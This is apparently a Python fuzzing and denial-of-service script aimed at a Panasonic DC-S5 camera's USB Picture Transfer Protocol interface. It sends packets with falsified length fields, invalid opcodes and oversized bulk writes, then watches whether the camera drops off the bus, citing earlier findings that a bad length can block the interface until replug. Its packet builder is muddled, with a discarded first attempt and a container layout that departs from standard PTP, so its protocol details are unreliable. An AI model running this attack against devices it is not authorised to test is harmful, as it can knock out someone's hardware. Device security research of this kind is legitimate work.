#!/usr/bin/env python3
"""
S5 PTP (Picture Transfer Protocol) Attack
Target: Panasonic DC-S5 via USB PTP (class 0x06/0x01/0x01)

Based on S1RM2 findings:
- PTP length field not properly validated
- Can cause permanent PTP block (DoS requiring USB replug)

Attack vectors:
1. Valid PTP GetDeviceInfo (baseline)
2. PTP with oversized bLength
3. PTP with undersized bLength
4. Unknown/invalid PTP opcodes
5. Bulk overflow on EP 0x01
"""
import usb1
import struct
import time
import sys

VID = 0x04DA
PID = 0x2382

PTP_CONTAINER = 0x0100
PTP_EVENT = 0x4000
PTP_CMD = 0x0001

# PTP opcodes
OP_GET_DEVICE_INFO = 0x1001
OP_OPEN_SESSION = 0x1002
OP_CLOSE_SESSION = 0x1003
OP_GET_FORMATS = 0x1004
OP_GET_CAPTURE_FORMATS = 0x1005
OP_GET_PARTIAL_CAPTURE = 0x1006
OP_GET_NUM_IMAGES = 0x1007
OP_GET_IMAGE_INFO = 0x1008
OP_GET_THUMBNAIL = 0x1009
OP_DELETE_IMAGE = 0x100A
OP_STORE_IMAGE = 0x100B
OP_COPY_IMAGE = 0x100C
OP_GET_STORAGE_INFO = 0x100D
OP_FORMAT_STORAGE = 0x100E
OP_RESET_DEVICE = 0x1010
OP_GET_EXTENDED_CAPTURE = 0x1012
OP_GET_OBJECT_FILE_NAME = 0x1013

def make_ptp_packet(opcode, params=b'', txn_id=1, resp_code=PTP_CMD):
    """Create a PTP container packet"""
    # Container header: bContainerCode(2) + bLength(4) + bTransactionID(4) + bResponseCode(2) = 12 bytes
    # Then: bOpcode(2) + bParameters(variable)
    total_params = 2 + len(params)  # opcode + params
    total_length = 12 + total_params  # container header + params section
    packet = struct.pack('<I', PTP_CONTAINER)  # bContainerCode (2) + bLength low byte
    # Actually, the PTP container structure is:
    # bContainerCode (2 bytes LE) = 0x0100
    # bLength (4 bytes LE) = total length of the packet
    # bTransactionID (4 bytes)
    # bResponseCode (2 bytes)
    # ... then the actual content (opcode + params)
    
    # Let me re-do this with the correct structure
    content = struct.pack('<H', opcode) + params
    bLength = 12 + len(content)  # total packet size
    
    packet = struct.pack('<H', PTP_CONTAINER)  # bContainerCode
    packet += struct.pack('<I', bLength)       # bLength (total size including this field)
    packet += struct.pack('<I', txn_id)        # bTransactionID
    packet += struct.pack('<H', resp_code)     # bResponseCode
    packet += content                          # opcode + params
    
    return packet

def make_ptp_raw(data):
    """Create a PTP container with raw data (for malformed packets)"""
    bLength = 12 + len(data)
    packet = struct.pack('<H', PTP_CONTAINER)
    packet += struct.pack('<I', bLength)
    packet += struct.pack('<I', 1)      # txn_id
    packet += struct.pack('<H', PTP_CMD)  # resp_code
    packet += data
    return packet

def make_ptp_bad_length(opcode, params=b'', claimed_length=None, txn_id=1):
    """Create a PTP packet with manipulated length field"""
    content = struct.pack('<H', opcode) + params
    if claimed_length is None:
        claimed_length = 12 + len(content)
    
    packet = struct.pack('<H', PTP_CONTAINER)
    packet += struct.pack('<I', claimed_length)  # WRONG length
    packet += struct.pack('<I', txn_id)
    packet += struct.pack('<H', PTP_CMD)
    packet += content
    return packet

def read_response(handle, ep_addr=0x82, size=1024, timeout=5000):
    """Read a PTP response from the bulk IN endpoint"""
    try:
        data = handle.bulkRead(ep_addr, size, timeout)
        return data
    except usb1.USBError as e:
        return None, str(type(e).__name__)
    except Exception as e:
        return None, f"{type(e).__name__}: {e}"

def send_bulk(handle, ep_addr, data, timeout=5000):
    """Send data to a bulk OUT endpoint"""
    try:
        ret = handle.bulkWrite(ep_addr, data, timeout)
        return ret
    except usb1.USBError as e:
        return -1
    except Exception as e:
        return -1

def check_alive(ctx):
    """Check if device is still connected"""
    try:
        h = ctx.openByVendorIDAndProductID(VID, PID)
        h.close()
        return True
    except:
        return False

def main():
    print("=" * 60)
    print("S5 PTP Attack - Phase 1")
    print("=" * 60)
    
    ctx = usb1.LibUSBContext()
    
    try:
        h = ctx.openByVendorIDAndProductID(VID, PID)
    except usb1.USBErrorNoDevice:
        print("ERROR: DC-S5 not found")
        sys.exit(1)
    
    dev = h.getDevice()
    print(f"Connected: {dev.getManufacturer()} {dev.getProduct()}")
    
    # Claim interface 0 and set alt setting 0
    if h.kernelDriverActive(0):
        h.detachKernelDriver(0)
    h.claimInterface(0)
    h.setInterfaceAltSetting(0, 0)
    print("Interface claimed, alt 0 set")
    
    EP_OUT = 0x01
    EP_IN = 0x82
    EP_INT = 0x83
    
    # === Phase 1: Valid PTP GetDeviceInfo (baseline) ===
    print("\n--- Phase 1: Valid PTP GetDeviceInfo ---")
    pkt = make_ptp_packet(OP_GET_DEVICE_INFO)
    print(f"  Sending {len(pkt)} bytes: {pkt.hex()}")
    
    ret = send_bulk(h, EP_OUT, pkt)
    print(f"  Send: ret={ret}")
    
    if ret >= 0:
        # Read response
        time.sleep(0.5)
        try:
            resp = h.bulkRead(EP_IN, 2048, 5000)
            print(f"  Response ({len(resp)} bytes): {resp.hex()[:128]}")
            if len(resp) >= 14:
                resp_len = struct.unpack_from('<I', resp, 2)[0]
                txn = struct.unpack_from('<I', resp, 6)[0]
                code = struct.unpack_from('<H', resp, 10)[0]
                opcode = struct.unpack_from('<H', resp, 12)[0]
                print(f"  Parsed: length={resp_len} txn=0x{txn:08X} code=0x{code:04X} opcode=0x{opcode:04X}")
        except Exception as e:
            print(f"  Read failed: {e}")
    
    time.sleep(0.5)
    
    # === Phase 2: PTP with manipulated length ===
    print("\n--- Phase 2: PTP Length Manipulation ---")
    print("  Testing: bLength > actual data (claiming more bytes than sent)")
    
    # Test: claim length 65536 but only send 14 bytes
    test_cases = [
        ("Normal", make_ptp_packet(OP_GET_DEVICE_INFO)),
        ("Length=1000 (actual=14)", make_ptp_bad_length(OP_GET_DEVICE_INFO, claimed_length=1000)),
        ("Length=65535 (actual=14)", make_ptp_bad_length(OP_GET_DEVICE_INFO, claimed_length=65535)),
        ("Length=4294967295 (actual=14)", make_ptp_bad_length(OP_GET_DEVICE_INFO, claimed_length=4294967295)),
        ("Length=8 (undersized)", make_ptp_bad_length(OP_GET_DEVICE_INFO, claimed_length=8)),
    ]
    
    for label, pkt in test_cases:
        print(f"\n  [{label}] packet={len(pkt)} bytes")
        ret = send_bulk(h, EP_OUT, pkt)
        print(f"    Send ret={ret}")
        
        if ret >= 0:
            time.sleep(0.5)
            try:
                resp = h.bulkRead(EP_IN, 1024, 3000)
                print(f"    Response: {len(resp)} bytes")
            except usb1.USBError as e:
                print(f"    Read error: {type(e).__name__}")
            except Exception as e:
                print(f"    Read error: {e}")
        
        # Check device alive
        time.sleep(0.5)
        if not check_alive(ctx):
            print(f"\n  *** DEVICE DISCONNECTED after [{label}] ***")
            print("  Waiting for recovery...")
            for i in range(30):
                time.sleep(1)
                if check_alive(ctx):
                    print(f"  Reconnected after {i+1}s")
                    break
            return
    
    # === Phase 3: Unknown/Invalid opcodes ===
    print("\n--- Phase 3: Unknown PTP Opcodes ---")
    
    bad_opcodes = [
        0x0000, 0xFFFF, 0x10FF, 0x2000, 0xFFFF,
        0x1000, 0x1014, 0x1015, 0x9999, 0xDEAD,
    ]
    
    for op in bad_opcodes:
        pkt = make_ptp_packet(op)
        ret = send_bulk(h, EP_OUT, pkt)
        print(f"  OP=0x{op:04X}: send ret={ret}")
        
        if ret >= 0:
            time.sleep(0.3)
            try:
                resp = h.bulkRead(EP_IN, 256, 2000)
                print(f"    Response: {len(resp)} bytes, code=0x{struct.unpack_from('<H', resp, 10)[0]:04X}")
            except:
                pass
        
        if not check_alive(ctx):
            print(f"  *** DEVICE DISCONNECTED after OP=0x{op:04X} ***")
            break
    
    # === Phase 4: Bulk overflow ===
    print("\n--- Phase 4: Bulk OUT Overflow ---")
    print("  Sending data larger than wMaxPacketSize (512)")
    
    # Send 1024 bytes (2x max packet)
    overflow_data = b'\x01' * 1024
    ret = send_bulk(h, EP_OUT, overflow_data, 5000)
    print(f"  1024 bytes: ret={ret}")
    time.sleep(0.5)
    
    # Send 4096 bytes
    overflow_data = b'\x01' * 4096
    ret = send_bulk(h, EP_OUT, overflow_data, 5000)
    print(f"  4096 bytes: ret={ret}")
    time.sleep(0.5)
    
    # Send 65536 bytes
    if check_alive(ctx):
        overflow_data = b'\x01' * 65536
        ret = send_bulk(h, EP_OUT, overflow_data, 5000)
        print(f"  65536 bytes: ret={ret}")
    
    # Final check
    time.sleep(1)
    print("\n--- Final Device Status ---")
    if check_alive(ctx):
        print("  Device still connected")
    else:
        print("  *** DEVICE DISCONNECTED ***")
        print("  Waiting 30s...")
        for i in range(30):
            time.sleep(1)
            if check_alive(ctx):
                print(f"  Reconnected after {i+1}s")
                break
    
    # Cleanup
    try:
        h.releaseInterface(0)
    except:
        pass
    h.close()
    ctx.close()
    print("\nDone.")

if __name__ == "__main__":
    main()
